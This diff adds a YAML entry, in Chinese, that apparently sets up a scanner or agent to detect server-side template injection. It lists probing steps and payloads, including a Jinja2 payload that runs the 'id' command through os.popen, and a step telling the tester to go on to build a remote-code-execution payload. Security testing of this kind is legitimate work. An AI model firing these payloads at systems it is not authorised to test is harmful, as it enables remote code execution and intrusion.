@@ -1,0 +1,15 @@
+type: SSTI
+name: 服务端模板注入
+description: 模板引擎将用户输入当作模板解析，可 RCE
+need_detect: 目标使用模板引擎（Jinja2/Twig/FreeMarker 等），且用户输入进入模板渲染
+prompt: |
+  SSTI 检测：
+  1. 输入 {{7*7}} 或 ${7*7}，观察是否返回 49
+  2. 输入 {{config}} 或 {{7*'7'}} 判断引擎类型
+  3. 确认后构造 RCE payload（Jinja2 可用 os.popen 读取命令输出）
+  4. 若 {{ 被过滤，先测 7*7（不加括号）判断后端
+payloads:
+  - "{{7*7}}"
+  - "${7*7}"
+  - "{{config}}"
+  - "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
